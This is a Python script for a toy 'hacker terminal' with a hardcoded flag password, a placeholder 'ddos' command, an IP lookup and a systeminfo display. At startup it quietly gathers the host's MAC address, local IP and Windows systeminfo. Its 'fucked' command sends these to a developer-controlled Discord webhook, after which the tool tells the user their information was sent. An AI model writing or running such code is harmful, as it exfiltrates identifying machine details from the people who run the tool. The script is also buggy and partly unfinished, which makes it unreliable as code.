import getpass
import os
import sys
import time
import requests
import colorama
import hashlib
import socket
from getmac import get_mac_address as gma
from discord import Webhook, RequestsWebhookAdapter
import subprocess
from colorama import Style, Fore
colorama.init()


if sys.platform == "linux":
    clear = lambda: os.system("clear")
else:
    clear = lambda: os.system("cls")

red = Fore.RED
green = Fore.GREEN
white = Fore.WHITE
megenta = Fore.MAGENTA
bright = Style.BRIGHT
normal = Style.NORMAL
webhookk = Webhook.from_url('Enter Your ', adapter=RequestsWebhookAdapter())
macaddd = gma()
ipp = socket.gethostbyname(socket.gethostname())
hashed_string_mac = hashlib.sha256(macaddd.encode('utf-8')).hexdigest()
hashed_string_ip = hashlib.sha256(ipp.encode('utf-8')).hexdigest()

Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
new = []

# arrange the string into clear info
for item in Id:
    new.append(str(item.split("\r")[:-1]))
for i in new:
    info1 = i[2:-2]
    hashed_string_info1 = hashlib.sha256(info1.encode('utf-8')).hexdigest()


passwdbr = getpass.getpass(f"{bright}{green} Enter the Flag:{white} ")
if passwdbr == "01011000":
    print(f"{bright}{green} Successfully Logged In{white}")
    time.sleep(5)
    clear()
else:
    print(f"{bright}{red} You have entered an wrong password")
    time.sleep(6)
    exit()

# mac - ({gma()})
# ip - ({socket.gethostbyname(socket.gethostname())})
# current Location -  {os.getcwd()}

def systeminfo():
    Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    new = []

    # arrange the string into clear info
    for item in Id:
        new.append(str(item.split("\r")[:-1]))
    for i in new:
        print(i[2:-2])

def ipinfo():
    ip = input(f"{bright}{green} Ip:{white} ")
    payload = {"ip":ip}
    r = requests.post('https://ipinfo.io', data=payload)
    print(r)
    time.sleep(10)
    clear()
    BruhMrX()

def BruhMrX():
    l1ght = input(bright + megenta + f"root@{socket.gethostbyname(socket.gethostname())} {white}$ ")
    if l1ght == 'ddos':
        pass
    elif l1ght == 'ipinfo':
        ipinfo()
    elif l1ght == 'systeminfo':
        systeminfo()
        time.sleep(6)
        BruhMrX()

    elif l1ght == 'syshash':
        print(hashed_string_mac)
        print(hashed_string_ip)
        print(hashed_string_info1)
        time.sleep(6)
        clear()
        BruhMrX()
    elif l1ght == 'fucked':
        webhookk.send(f"Hashed ip - {hashed_string_ip} - Decoded - {ipp} \nHashed Mac Add - f{hashed_string_mac} - decoded - {macaddd}\nSystem info - {hashed_string_info1}- decoed - {info1},  Sync With SHA256")
        print('Your All Information Hass been send to the Devloper of This Tool.')
        time.sleep(7)
        BruhMrX()
    else:
        print('idk')

BruhMrX()